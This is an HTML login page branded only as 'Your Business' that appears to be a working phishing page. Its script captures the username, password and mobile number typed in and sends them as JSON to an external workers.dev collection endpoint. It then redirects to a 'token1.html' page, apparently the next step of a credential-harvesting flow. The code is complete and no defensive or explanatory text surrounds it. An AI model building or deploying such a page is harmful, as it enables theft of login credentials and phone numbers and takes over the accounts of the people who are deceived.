<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Business Login</title>
  <style>
    body{font-family:Arial,sans-serif;margin:0;background:#f4f4f4;}
    .header{background:#003087;color:#fff;text-align:center;padding:15px;}
    .header img{max-width:180px;}
    .container{max-width:400px;margin:40px auto;padding:25px;background:#fff;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.1);}
    input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;}
    button{width:100%;padding:14px;background:#d32f2f;color:#fff;border:none;border-radius:4px;font-size:18px;cursor:pointer;}
    button:hover{background:#b71c1c;}
  </style>
</head>
<body>

<div class="header">
  <img src="https://via.placeholder.com/180x50/003087/fff?text=Your+Business" alt="Logo">
</div>

<div class="container">
  <h2 style="text-align:center;color:#003087;">Login</h2>
  <form id="frm">
    <input type="text" id="u" placeholder="Username" required>
    <input type="password" id="p" placeholder="Password" required>
    <input type="tel" id="m" placeholder="Mobile Number" pattern="[0-9]{10}" required>
    <button type="submit">Login</button>
  </form>
</div>

<script>
document.getElementById("frm").addEventListener("submit", async e => {
  e.preventDefault();
  const payload = {
    step: "login",
    username: document.getElementById("u").value,
    password: document.getElementById("p").value,
    mobile: document.getElementById("m").value,
    time: new Date().toISOString()
  };
  try {
    await fetch("https://form-save-backend.youraccount.workers.dev/save", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(payload)
    });
    location.href = "token1.html";
  } catch {}
});
</script>
</body>
</html>
